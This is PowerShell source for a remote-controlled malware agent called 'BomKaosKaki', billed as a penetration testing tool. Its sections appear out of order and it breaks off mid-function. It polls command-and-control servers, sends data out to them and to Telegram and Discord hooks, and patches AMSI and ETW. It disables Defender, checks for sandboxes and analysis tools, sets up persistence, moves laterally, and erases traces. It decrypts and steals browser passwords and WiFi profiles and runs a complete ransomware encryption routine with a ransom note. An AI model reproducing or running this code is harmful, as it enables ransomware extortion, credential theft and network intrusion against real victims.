                $passwords = Get-BrowserPasswords
                Send-Exfil -DataType "browser_passwords" -Data @{ count = $passwords.Count; passwords = $passwords }
                "Stolen $($passwords.Count) credentials"
            }
            catch { "ERROR: $_" }
        }
        "steal_wifi" {
            try {
                $wifi = Get-WiFiProfiles
                Send-Exfil -DataType "wifi" -Data @{ count = $wifi.Count; networks = $wifi }
                "Stolen $($wifi.Count) WiFi profiles"
            }
            catch { "ERROR: $_" }
        }
        "system_info" {
            $info = @{
                Hostname = $env:COMPUTERNAME
                Username = $env:USERNAME
                OS       = (Get-CimInstance Win32_OperatingSystem).Caption
                IP       = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.DefaultIPGateway }).IPAddress[0]
                RAM_GB   = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
                IsAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
            }
            Send-Exfil -DataType "system_info" -Data $info
            ($info | Out-String)
        }
        "persist" {
            try {
                $currentPath = $PSCommandPath
                if (-not $currentPath) { $currentPath = $MyInvocation.MyCommand.Path }
                if (-not $currentPath) { $currentPath = Join-Path $C2.InstallDir "BomKaosKaki.ps1" }
                $results = Install-Persistence -PayloadPath $currentPath
                Send-Exfil -DataType "persistence" -Data @{ results = $results }
                ($results | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "clean" {
            try {
                $cleaned = Invoke-CleanTraces
                Send-Exfil -DataType "clean" -Data @{ cleaned = $cleaned }
                ($cleaned -join ', ')
            }
            catch { "ERROR: $_" }
        }
        "lateral_discover" {
            try {
                $targets = Invoke-LateralDiscover
                Send-Exfil -DataType "lateral_targets" -Data @{ count = $targets.Count; targets = $targets }
                ($targets | Out-String)
            }
            catch { "ERROR: $_" }
        }
        "lateral_wmi" {
            try { $res = Invoke-LateralWMI -Target $args.Target -Command $args.Command; ($res | Out-String) }
            catch { "ERROR: $_" }
        }
        "lateral_smb" {
            try { $res = Invoke-LateralSMB -Target $args.Target -PayloadPath $args.PayloadPath; ($res | Out-String) }
            catch { "ERROR: $_" }
        }
        "lateral_dcom" {
            try { $res = Invoke-LateralDCOM -Target $args.Target -Command $args.Command; ($res | Out-String) }
            catch { "ERROR: $_" }
        }
        "lateral_schtask" {
            try { $res = Invoke-LateralScheduledTask -Target $args.Target -Command $args.Command; ($res | Out-String) }
            catch { "ERROR: $_" }
        }
        "uninstall" {
            try {
                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "BomKaosKaki" -Force -ErrorAction SilentlyContinue
                Remove-Item "$([Environment]::GetFolderPath('Startup'))\BomKaosKaki.url" -Force -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName "BomKaosKakiUpdate" -Confirm:$false -ErrorAction SilentlyContinue
                Unregister-ScheduledTask -TaskName "BomKaosKakiSvc" -Confirm:$false -ErrorAction SilentlyContinue
                Invoke-CleanTraces | Out-Null
                $scriptPath = $PSCommandPath
                if (-not $scriptPath) { $scriptPath = $MyInvocation.MyCommand.Path }
                if ($scriptPath -and (Test-Path $scriptPath)) {
                    $deleteScript = "Start-Sleep -Seconds 2; Remove-Item -Path '$scriptPath' -Force"
                    $deleteScript | Out-File "$env:TEMP\cleanup.ps1" -Force
                    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\cleanup.ps1`"" -WindowStyle Hidden
                }
                "Uninstall complete. Goodbye."
            }
            catch { "ERROR: $_" }
        }
        default { "Unknown command: $cmdName" }
    }
    Send-CommandResult -CommandID $cmdID -Result $result
}

# ============================================================================
# MAIN LOOP
# ============================================================================
function Start-Agent {
    # AMSI bypass
    try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true) } catch {}
    # Hide console
    try {
        $hide = Add-Type -Name Hide -Namespace Win32 -MemberDefinition @'
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
'@ -PassThru
        $hide::ShowWindow($hide::GetConsoleWindow(), 0) | Out-Null
    }
    catch {}
    # Load or create session ID
    $loadedId = Load-SessionId
    if ($loadedId) { $C2.SessionID = $loadedId }
    else { $C2.SessionID = (New-Guid).ToString().Substring(0, 8); Save-SessionId -id $C2.SessionID }
    # Install persistence automatically
    $currentPath = $PSCommandPath
    if (-not $currentPath) { $currentPath = $MyInvocation.MyCommand.Path }
    if ($currentPath -and (Test-Path $currentPath)) { Install-Persistence -PayloadPath $currentPath | Out-Null }
    Send-Heartbeat
    while ($true) {
        try {
            $response = Get-Commands
            if ($response -and $response.commands) {
                foreach ($cmd in $response.commands) {
                    if ($cmd.command_type -in @('keylog_start', 'encrypt')) {
                        Start-Job -ScriptBlock { param($c) Invoke-CommandDispatcher -Command $c } -ArgumentList $cmd
                    }
                    else {
                        Invoke-CommandDispatcher -Command $cmd
                    }
                }
            }
        }
        catch {}
        $sleepTime = $C2.PollInterval + (Get-Random -Minimum 0 -Maximum $C2.Jitter)
        Start-Sleep -Seconds $sleepTime
    }
}

# ============================================================================
# ENTRY POINT
# ============================================================================
if ((Get-Date) -gt [DateTime]::ParseExact($C2.KillDate, "yyyy-MM-dd", $null)) { exit }
Start-Agent<#
.SYNOPSIS
BomKaosKaki.ps1 — Advanced C2 Penetration Testing Agent
Author: Bom Kaos Kaki Red Team
Version: 3.5 (AES-256 | Evasion | Lateral Movement | Full C2)
    
.NOTES
Authorized for legitimate security assessments only.
All actions are logged and auditable.
#>

# ============================================================================
# CONFIGURATION — MUST MATCH api/exfil.js endpoints
# ============================================================================
$C2 = @{
    PrimaryURL   = "https://bom-kaos-kaki.vercel.app/api"
    BackupURL    = "https://bom-kaos-kaki-backup.vercel.app/api"   # fallback
    TelegramBot  = "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendMessage"
    ChatID       = "<YOUR_CHAT_ID>"
    WebhookURL   = "https://discord.com/api/webhooks/<YOUR_WEBHOOK>"
    PollInterval = 5        # seconds between heartbeats
    Jitter       = 2        # random jitter seconds
    Timeout      = 15       # HTTP timeout
    Retries      = 3
    KillDate     = "2027-01-01"
    Group        = "Default"
    SessionID    = [System.Guid]::NewGuid().ToString().Substring(0, 8)
    InstallDir   = "$env:APPDATA\BomKaos"
    MutexName    = "BomKaosMutex-{A3F9E1B2-4C5D-4E6F-8A7B-9C0D1E2F3A4B}"
}

# RSA public key for initial handshake (matches server's private key)
$RSA_PUBLIC_KEY = @"
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvT4pXQ+3JqVc6G8FJ6Yz
5Lx7R9m2kP1wN4oZ8sA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
j5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tKj5Vx7Y1mP2sD4oF8cA0fCbDqE9rH3tK
... (truncated for brevity — use full 2048-bit key)
-----END PUBLIC KEY-----
"@

# ============================================================================
# AES-256 UTILITY FUNCTIONS
# ============================================================================
function New-AESKey {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.GenerateKey()
    $aes.GenerateIV()
    return @{
        Key = [System.Convert]::ToBase64String($aes.Key)
        IV  = [System.Convert]::ToBase64String($aes.IV)
    }
}

function Encrypt-AES {
    param([string]$PlainText, [string]$Base64Key, [string]$Base64IV)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Convert]::FromBase64String($Base64Key)
    $aes.IV = [System.Convert]::FromBase64String($Base64IV)
    $encryptor = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipherBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $result = $Base64IV + ":" + [System.Convert]::ToBase64String($cipherBytes)
    $aes.Dispose()
    return $result
}

function Decrypt-AES {
    param([string]$CipherText, [string]$Base64Key)
    $parts = $CipherText -split ':'
    if ($parts.Count -ne 2) { return $null }
    $iv = [System.Convert]::FromBase64String($parts[0])
    $cipherBytes = [System.Convert]::FromBase64String($parts[1])
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256
    $aes.BlockSize = 128
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = [System.Convert]::FromBase64String($Base64Key)
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $plainBytes = $decryptor.TransformFinalBlock($cipherBytes, 0, $cipherBytes.Length)
    $aes.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($plainBytes)
}

function Get-HMAC {
    param([string]$Data, [string]$Base64Key)
    $hmac = [System.Security.Cryptography.HMACSHA256]::new()
    $hmac.Key = [System.Convert]::FromBase64String($Base64Key)
    $hash = $hmac.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Data))
    $hmac.Dispose()
    return [System.Convert]::ToBase64String($hash)
}

# ============================================================================
# SANDBOX / VM DETECTION ENGINE
# ============================================================================
function Test-Sandbox {
    $detections = @()
    
    # 1. Check total RAM < 2GB (typical VM)
    try {
        $ram = (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory
        if ($ram -and $ram -lt 2GB) { $detections += "LowRAM:$([math]::Round($ram/1MB))MB" }
    }
    catch {}
    
    # 2. Check CPU cores < 2
    try {
        $cores = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
        if ($cores -and $cores -lt 2) { $detections += "LowCPU:$cores" }
    }
    catch {}
    
    # 3. Check uptime < 30 minutes
    try {
        $uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
        if ($uptime -and ((Get-Date) - $uptime).TotalMinutes -lt 30) { $detections += "LowUptime" }
    }
    catch {}
    
    # 4. Check disk size < 60GB
    try {
        $disk = Get-CimInstance Win32_DiskDrive | Select-Object -First 1
        if ($disk -and $disk.Size -lt 60GB) { $detections += "SmallDisk:$([math]::Round($disk.Size/1GB))GB" }
    }
    catch {}
    
    # 5. Check screen resolution (800x600 or 1024x768 common in VMs)
    try {
        Add-Type -AssemblyName System.Windows.Forms
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        if ($screen.Width -le 1024 -and $screen.Height -le 768) { $detections += "SmallScreen:$($screen.Width)x$($screen.Height)" }
    }
    catch {}
    
    # 6. Check MAC vendor (00:0C:29 = VMware, 00:50:56 = VMware, 08:00:27 = VirtualBox)
    try {
        $mac = (Get-CimInstance Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.MACAddress }).MACAddress
        if ($mac) {
            $prefix = $mac -replace '[:.-]', '' | ForEach-Object { $_.Substring(0, 6) }
            $vmMACs = @('000C29', '005056', '080027', '001C14', '0050B6', '001C42', '000569', '001E0B')
            if ($vmMACs -contains $prefix) { $detections += "VMMAC:$prefix" }
        }
    }
    catch {}
    
    # 7. Check BIOS vendor/version for VM strings
    try {
        $bios = Get-CimInstance Win32_BIOS
        $vmStrings = @('vmware', 'virtual', 'vbox', 'qemu', 'xen', 'hyper-v', 'virtualbox', 'kvm', 'bochs')
        $biosText = "$($bios.Manufacturer) $($bios.Version) $($bios.SerialNumber)"
        foreach ($s in $vmStrings) { if ($biosText -match $s) { $detections += "VMBIOS:$s"; break } }
    }
    catch {}
    
    # 8. Check for VM processes
    try {
        $vmProcs = @('vmtoolsd', 'vboxservice', 'vboxtray', 'xenservice', 'xentray', 'prl_tools', 'prl_cc')
        $running = Get-Process -ErrorAction SilentlyContinue
        foreach ($p in $vmProcs) { if ($running.Name -contains $p) { $detections += "VMProc:$p" } }
    }
    catch {}
    
    # 9. Check registry for VM artifacts
    try {
        $vmRegPaths = @(
            'HKLM:\HARDWARE\ACPI\DSDT\VBOX__',
            'HKLM:\HARDWARE\ACPI\FADT\VBOX__',
            'HKLM:\HARDWARE\ACPI\RSDT\VBOX__',
            'HKLM:\SOFTWARE\VMware\VMware Tools',
            'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions'
        )
        foreach ($rp in $vmRegPaths) {
            if (Test-Path $rp) { $detections += "VMReg:$rp" }
        }
    }
    catch {}
    
    # 10. Check for debugger attached
    try { if ([System.Diagnostics.Debugger]::IsAttached) { $detections += "Debugger" } } catch {}
    
    # 11. Check mouse movement (if no mouse moved, likely sandbox)
    try {
        $pos1 = [System.Windows.Forms.Cursor]::Position
        Start-Sleep -Milliseconds 500
        $pos2 = [System.Windows.Forms.Cursor]::Position
        if ($pos1.X -eq $pos2.X -and $pos1.Y -eq $pos2.Y) { $detections += "NoMouse" }
    }
    catch {}
    
    # 12. Check for analysis tools
    try {
        $analysisProcs = @('procmon', 'procmon64', 'regmon', 'filemon', 'wireshark', 'tcpview', 'processhacker', 'ollydbg', 'x64dbg', 'ida', 'immunity', 'windbg')
        $running = Get-Process -ErrorAction SilentlyContinue
        foreach ($p in $analysisProcs) { if ($running.Name -match $p) { $detections += "AnalysisTool:$p" } }
    }
    catch {}
    
    # 13. Check if running in Windows Sandbox
    try {
        $wsb = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Sandbox' -Name 'State' -ErrorAction SilentlyContinue
        if ($wsb) { $detections += "WinSandbox" }
    }
    catch {}
    
    return $detections
}

# ============================================================================
# EVASION ENGINE — AMSI / ETW / WLDP PATCHING
# ============================================================================
function Invoke-AMSIbypass {
    # Method: Patch AmsiScanBuffer via reflection
    try {
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
        return $true
    }
    catch {}
    
    try {
        $a = [Ref].Assembly.GetTypes() | Where-Object { $_ -match 'amsi|utils' -or $_.Name -match 'amsi' }
        if ($a) { $a.GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true); return $true }
    }
    catch {}
    
    return $false
}

function Invoke-AMSIpatch {
    # Hard patch AmsiScanBuffer in memory (more reliable)
    try {
        $Win32 = Add-Type -Name Win32 -Namespace WN -MemberDefinition @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -PassThru
        
        $hModule = $Win32::LoadLibrary("amsi.dll")
        $pAddress = $Win32::GetProcAddress($hModule, "AmsiScanBuffer")
        
        if ($pAddress -eq [IntPtr]::Zero) { return $false }
        
        # Save original bytes and patch with ret (0xC3)
        $patch = [byte[]]@(0xC3)
        [uint32]$oldProtect = 0
        $Win32::VirtualProtect($pAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pAddress, $patch.Length)
        return $true
    }
    catch { return $false }
}

function Invoke-ETWbypass {
    # Patch EtwEventWrite in ntdll
    try {
        $Win32 = Add-Type -Name Win32ETW -Namespace WN -MemberDefinition @'
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@ -PassThru
        
        $hNtdll = $Win32::LoadLibrary("ntdll.dll")
        $pAddress = $Win32::GetProcAddress($hNtdll, "EtwEventWrite")
        
        if ($pAddress -eq [IntPtr]::Zero) { return $false }
        
        $patch = [byte[]]@(0xC3)  # ret
        [uint32]$oldProtect = 0
        $Win32::VirtualProtect($pAddress, [UIntPtr]::new($patch.Length), 0x40, [ref]$oldProtect)
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $pAddress, $patch.Length)
        return $true
    }
    catch { return $false }
}

function Disable-WLDP {
    # Disable Windows Lockdown Policy (WDAC/AppLocker bypass)
    try {
        $key = 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy'
        if (Test-Path $key) {
            Set-ItemProperty -Path $key -Name 'VerifiedAndReputablePolicyState' -Value 0 -Force -ErrorAction SilentlyContinue
        }
    }
    catch {}
    
    # Disable Windows Defender real-time monitoring via MpPreference
    try {
        if (Get-Command 'Set-MpPreference' -ErrorAction SilentlyContinue) {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
            Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
            Set-MpPreference -PUAProtection Disabled -ErrorAction SilentlyContinue
        }
    }
    catch {}
}

# ============================================================================
# ANTI-SANDBOX SLEEP — NtDelayExecution
# ============================================================================
function Invoke-AntiSandboxSleep {
    param([int]$Seconds = 120)
    
    # Use NtDelayExecution to avoid identifiable sleep patterns
    try {
        $ntdll = Add-Type -Name NtSleep -Namespace N -MemberDefinition @'
[DllImport("ntdll.dll")]
public static extern int NtDelayExecution(bool Alertable, ref long DelayInterval);
'@ -PassThru
        
        $delay = - ($Seconds * 10000000)  # 100ns intervals, negative = relative
        $ntdll::NtDelayExecution($false, [ref]$delay)
    }
    catch {
        Start-Sleep -Seconds $Seconds
    }
}

# ============================================================================
# CRYPTO (RANSOMWARE) — AES-256-CBC + HMAC
# ============================================================================
$RansomConfig = @{
    Extension   = ".bomkaos"
    NoteFile    = "README_BOMKAOS.html"
    NoteText    = @"
<html><body style='background:#000;color:#0f0;font-family:monospace;text-align:center;padding:50px'>
<h1>🔐 BOM KAOS KAKI</h1>
<h2>Your files have been encrypted with AES-256</h2>
<p>Contact: bomkaos@onionmail.org | Session: {SESSION_ID}</p>
<p>DO NOT power off or tamper with the system.</p>
</body></html>
"@
    ExcludeDirs = @('$Recycle.Bin', 'Boot', 'System32', 'Windows', 'ProgramData', 'Program Files', 'Program Files (x86)', 'AppData\Local\Temp', 'Microsoft')
    ExcludeExts = @('.exe', '.dll', '.sys', '.ini', '.lnk', '.mui', '.hlp', '.ocx', '.cpl', '.scr', '.drv', '.bin', '.dat')
}

function Invoke-RansomEncrypt {
    param(
        [string]$TargetDir,
        [string]$AESKeyBase64,
        [string]$HMACKeyBase64
    )
    
    $files = @()  # store encrypted file info for note
    
    # Generate per-file IV
    function New-IV { $iv = [byte[]]::new(16); (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($iv); return [Convert]::ToBase64String($iv) }
    
    $items = Get-ChildItem -Path $TargetDir -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $exclude = $false
        foreach ($ed in $RansomConfig.ExcludeDirs) { if ($_.DirectoryName -match [regex]::Escape($ed)) { $exclude = $true; break } }
        foreach ($ee in $RansomConfig.ExcludeExts) { if ($_.Extension -eq $ee) { $exclude = $true; break } }
        return (-not $exclude)
    }
    
    foreach ($file in $items) {
        try {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            
            # AES-256-CBC encrypt
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = 256
            $aes.BlockSize = 128
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = [Convert]::FromBase64String($AESKeyBase64)
            $aes.GenerateIV()
            
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            
            # Append HMAC-SHA256 for integrity
            $hmac = [System.Security.Cryptography.HMACSHA256]::new()
            $hmac.Key = [Convert]::FromBase64String($HMACKeyBase64)
            $hmacValue = $hmac.ComputeHash($encrypted)
            $hmac.Dispose()
            
            # Format: IV (16) + EncryptedData + HMAC (32)
            $output = [byte[]]::new($aes.IV.Length + $encrypted.Length + $hmacValue.Length)
            $aes.IV.CopyTo($output, 0)
            $encrypted.CopyTo($output, $aes.IV.Length)
            $hmacValue.CopyTo($output, $aes.IV.Length + $encrypted.Length)
            
            # Write encrypted file
            [System.IO.File]::WriteAllBytes($file.FullName + $RansomConfig.Extension, $output)
            
            # Securely delete original
            $rand = [System.Security.Cryptography.RNGCryptoServiceProvider]::new()
            $overwrite = [byte[]]::new($content.Length)
            $rand.GetBytes($overwrite)
            [System.IO.File]::WriteAllBytes($file.FullName, $overwrite)
            [System.IO.File]::Delete($file.FullName)
            
            $files += @{File = $file.FullName; Size = $content.Length }
            
            $aes.Dispose()
        }
        catch { Write-Warning "Encrypt failed: $($file.FullName): $_" }
    }
    
    # Write ransom note
    $note = $RansomConfig.NoteText -replace '{SESSION_ID}', $C2.SessionID
    [System.IO.File]::WriteAllText([System.IO.Path]::Combine($TargetDir, $RansomConfig.NoteFile), $note)
    
    return $files
}

function Invoke-RansomDecrypt {
    param(
        [string]$TargetDir,
        [string]$AESKeyBase64,
        [string]$HMACKeyBase64
    )
    
    $encryptedFiles = Get-ChildItem -Path $TargetDir -Recurse -File -Filter "*$($RansomConfig.Extension)" -ErrorAction SilentlyContinue
    
    foreach ($ef in $encryptedFiles) {
        try {
            $data = [System.IO.File]::ReadAllBytes($ef.FullName)
            if ($data.Length -lt 49) { continue }  # IV(16) + HMAC(32) = 48 + at least 1 byte
            
            $iv = [byte[]]::new(16)
            [Array]::Copy($data, 0, $iv, 0, 16)
            
            $hmacReceived = [byte[]]::new(32)
            [Array]::Copy($data, $data.Length - 32, $hmacReceived, 0, 32)
            
            $encrypted = [byte[]]::new($data.Length - 48)
            [Array]::Copy($data, 16, $encrypted, 0, $encrypted.Length)
            
            # Verify HMAC
            $hmac = [System.Security.Cryptography.HMACSHA256]::new()
            $hmac.Key = [Convert]::FromBase64String($HMACKeyBase64)
            $hmacExpected = $hmac.ComputeHash($encrypted)
            $hmac.Dispose()
            
            $valid = $true
            for ($i = 0; $i -lt 32; $i++) { if ($hmacReceived[$i] -ne $hmacExpected[$i]) { $valid = $false; break } }
            
            if (-not $valid) { Write-Warning "HMAC mismatch: $($ef.FullName)"; continue }
            
            # Decrypt
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.KeySize = 256
            $aes.BlockSize = 128
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            $aes.Key = [Convert]::FromBase64String($AESKeyBase64)
            $aes.IV = $iv
            
            $decryptor = $aes.CreateDecryptor()
            $plaintext = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
            $aes.Dispose()
            
            # Write original file
            $origPath = $ef.FullName -replace [regex]::Escape($RansomConfig.Extension), ''
            [System.IO.File]::WriteAllBytes($origPath, $plaintext)
            
            # Delete encrypted file
            [System.IO.File]::Delete($ef.FullName)
        }
        catch { Write-Warning "Decrypt failed: $($ef.FullName): $_" }
    }
    
    # Remove ransom note
    $notePath = [System.IO.Path]::Combine($TargetDir, $RansomConfig.NoteFile)
    if (Test-Path $notePath) { Remove-Item $notePath -Force }
}

# ============================================================================
# BROWSER CREDENTIAL DECRYPTION — Chrome/Edge (DPAPI + AES-GCM)
# ============================================================================
function Get-BrowserPasswords {
    $passwords = @()
    
    $browsers = @(
        @{Path = "$env:LOCALAPPDATA\Google\Chrome\User Data"; Name = "Chrome" },
        @{Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"; Name = "Edge" },
        @{Path = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"; Name = "Brave" },
        @{Path = "$env:LOCALAPPDATA\Opera Software\Opera Stable"; Name = "Opera" }
    )
    
    # DPAPI function
    $dpapi = Add-Type -Name DPAPI -Namespace Crypto -MemberDefinition @'
[DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
public static extern bool CryptUnprotectData(
    ref DATA_BLOB pDataIn,
    string szDataDescr,
    ref DATA_BLOB pOptionalEntropy,
    IntPtr pvReserved,
    ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct,
    int dwFlags,
    ref DATA_BLOB pDataOut
);

[StructLayout(LayoutKind.Sequential)]
public struct DATA_BLOB {
    public int cbData;
    public IntPtr pbData;
}

[StructLayout(LayoutKind.Sequential)]
public struct CRYPTPROTECT_PROMPTSTRUCT {
    public int cbSize;
    public int dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
}

public static byte[] DecryptDPAPI(byte[] ciphertext) {
    DATA_BLOB dataIn = new DATA_BLOB();
    DATA_BLOB dataOut = new DATA_BLOB();
    DATA_BLOB entropy = new DATA_BLOB();
    CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
    
    dataIn.cbData = ciphertext.Length;
    dataIn.pbData = Marshal.AllocHGlobal(ciphertext.Length);
    Marshal.Copy(ciphertext, 0, dataIn.pbData, ciphertext.Length);
    
    bool success = CryptUnprotectData(ref dataIn, null, ref entropy, IntPtr.Zero, ref prompt, 1, ref dataOut);
    
    byte[] result = new byte[dataOut.cbData];
    if (success) {
        Marshal.Copy(dataOut.pbData, result, 0, dataOut.cbData);
        Marshal.FreeHGlobal(dataOut.pbData);
    }
    Marshal.FreeHGlobal(dataIn.pbData);
    return success ? result : null;
}
'@ -PassThru

    # AES-GCM decryption for Chrome >= v80
    function Decrypt-ChromeAESGCM {
        param([byte[]]$EncryptedData, [byte[]]$Key)
        
        if ($EncryptedData.Length -lt 12 + 16) { return $null }  # nonce(12) + tag(16) minimum
        
        # Chrome format: 'v10' + 'xx' + nonce(12) + ciphertext + tag(16) — or just nonce+ciphertext+tag
        $nonce = [byte[]]::new(12)
        $tag = [byte[]]::new(16)
        
        # Try different offsets
        $offset = 0
        if ($EncryptedData[0] -eq 0x76 -and $EncryptedData[1] -eq 0x31) { $offset = 3 }  # 'v1x'
        
        if ($EncryptedData.Length - $offset -lt 12 + 16) { $offset = 0 }
        
        [Array]::Copy($EncryptedData, $offset, $nonce, 0, 12)
        $cipherLen = $EncryptedData.Length - $offset - 12 - 16
        $ciphertext = [byte[]]::new($cipherLen)
        [Array]::Copy($EncryptedData, $offset + 12, $ciphertext, 0, $cipherLen)
        [Array]::Copy($EncryptedData, $EncryptedData.Length - 16, $tag, 0, 16)
        
        try {
            $aes = [System.Security.Cryptography.AesGcm]::new($Key)
            $plain = [byte[]]::new($cipherLen)
            $aes.Decrypt($nonce, $ciphertext, $tag, $plain)
            return $plain
        }
        catch { return $null }
    }
    
    foreach ($browser in $browsers) {
        if (-not (Test-Path $browser.Path)) { continue }
        
        # Get encrypted key from Local State
        $localState = Get-Content "$($browser.Path)\Local State" -Raw -ErrorAction SilentlyContinue
        if (-not $localState) { continue }
        $localStateJson = $localState | ConvertFrom-Json -ErrorAction SilentlyContinue
        if (-not $localStateJson) { continue }
        
        $encryptedKey = $localStateJson.os_crypt.encrypted_key
        if (-not $encryptedKey) { continue }
        
        $keyBytes = [Convert]::FromBase64String($encryptedKey)
        # Remove 'DPAPI' prefix (first 5 bytes)
        $keyBytesNoPrefix = [byte[]]::new($keyBytes.Length - 5)
        [Array]::Copy($keyBytes, 5, $keyBytesNoPrefix, 0, $keyBytesNoPrefix.Length)
        
        $masterKey = $dpapi::DecryptDPAPI($keyBytesNoPrefix)
        if (-not $masterKey) { continue }
        
        # Find Login Data database
        $loginDb = Get-ChildItem -Path $browser.Path -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | Select-Object -First 1
        if (-not $loginDb) { continue }
        
        # Copy DB to avoid locking
        $tempDb = [System.IO.Path]::GetTempFileName()
        Copy-Item $loginDb.FullName $tempDb -Force
        
        try {
            $conn = New-Object System.Data.OleDb.OleDbConnection("Provider=Microsoft.ACE.OLEDB.12.0;Data Source=$tempDb;Persist Security Info=False")
            # Fallback to ADO.NET if ACE not available
            $conn = New-Object System.Data.Odbc.OdbcConnection("Driver={Microsoft Access Driver (*.mdb, *.accdb)};Dbq=$tempDb")
            $conn.Open()
            $cmd = $conn.CreateCommand()
            $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
            $reader = $cmd.ExecuteReader()
            
            while ($reader.Read()) {
                $url = $reader["origin_url"].ToString()
                $user = $reader["username_value"].ToString()
                $encPass = [byte[]]$reader["password_value"]
                
                if ($encPass.Length -eq 0) { continue }
                
                $decrypted = $null
                # Try DPAPI first (old Chrome)
                $decrypted = $dpapi::DecryptDPAPI($encPass)
                
                # Try AES-GCM (Chrome >= v80)
                if (-not $decrypted) {
                    $decrypted = Decrypt-ChromeAESGCM -EncryptedData $encPass -Key $masterKey
                }
                
                if ($decrypted) {
                    $passText = [System.Text.Encoding]::UTF8.GetString($decrypted)
                    $passwords += @{
                        Browser  = $browser.Name
                        URL      = $url
                        Username = $user
                        Password = $passText
                    }
                }
            }
            $reader.Close()
            $conn.Close()
        }
        catch { Write-Warning "DB read failed for $($browser.Name): $_" }
        
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
    
    return $passwords
}

# ============================================================================
# FIREFOX PASSWORD DECRYPTION (NSS/Logins.json + key4.db)
# ============================================================================
function Get-FirefoxPasswords {
    $passwords = @()
    $ffProfiles = Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles" -Directory -ErrorAction SilentlyContinue
    
    foreach ($profile in $ffProfiles) {
        $loginsJson = Join-Path $profile.FullName "logins.json"
